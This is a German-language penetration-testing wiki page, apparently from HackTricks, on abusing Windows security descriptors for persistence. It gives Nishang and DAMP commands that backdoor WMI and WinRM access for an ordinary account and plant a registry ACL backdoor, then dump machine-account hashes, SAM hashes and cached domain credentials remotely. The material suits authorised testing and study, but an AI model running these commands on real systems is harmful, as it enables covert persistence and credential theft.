# Sicherheitsdeskriptoren

{{#include ../../banners/hacktricks-training.md}}

## Sicherheitsdeskriptoren

Windows-Sicherheitsdeskriptoren enthalten eine Besitzer-SID, eine primäre Gruppen-SID, eine diskretionäre ACL (DACL), die den Zugriff steuert, und eine System-ACL (SACL), die hauptsächlich für die Überwachung verwendet wird. Die Security Descriptor Definition Language (SDDL) ist die textuelle Darstellung; ein ACE-String hat die Form `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

Ein Sicherheitsdeskriptor speichert, wem ein sicherungsfähiges Objekt gehört und welchen Principals bestimmte Rechte dafür gewährt oder verweigert werden. Wenn ein Angreifer eine DACL ändern kann, kann er einem Principal mit geringen Berechtigungen Rechte gewähren, die normalerweise eine administrative Rolle erfordern.

Dadurch sind gezielt geänderte Deskriptoren für Persistence nützlich: Das Konto bleibt außerhalb offensichtlicher privilegierter Gruppen, behält aber den Zugriff auf eine bestimmte Management-Oberfläche. Den ursprünglichen Deskriptor sollte man vor dem Testen sichern, damit die Änderung exakt entfernt werden kann.

### Zugriff auf WMI

Du kannst einem Benutzer Zugriff gewähren, um **WMI remote auszuführen** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### Zugriff auf WinRM

Gewähre einem Benutzer Zugriff auf einen Remote-PowerShell-/WinRM-Endpunkt mit Nishangs Funktion `Set-RemotePSRemoting`:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Remote access to hashes

DAMP kann eine registry-ACL backdoor erstellen, die später den Remote-Abruf des Maschinenkonto-Hashes, lokaler SAM-Hashes und zwischengespeicherter Domänenanmeldedaten ermöglicht. Das Gewähren dieser eingeschränkten Rechte für ein ansonsten gewöhnliches Konto – insbesondere gegenüber einem Domain Controller – bietet eine leistungsfähige Persistenz ohne die Mitgliedschaft in einer privilegierten Gruppe.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Siehe [**Silver Tickets**](silver-ticket.md), um zu erfahren, wie du den Hash des Computerkontos eines Domain Controllers verwenden könntest.

## References

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Zeichenfolgenformat von Security Descriptors](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
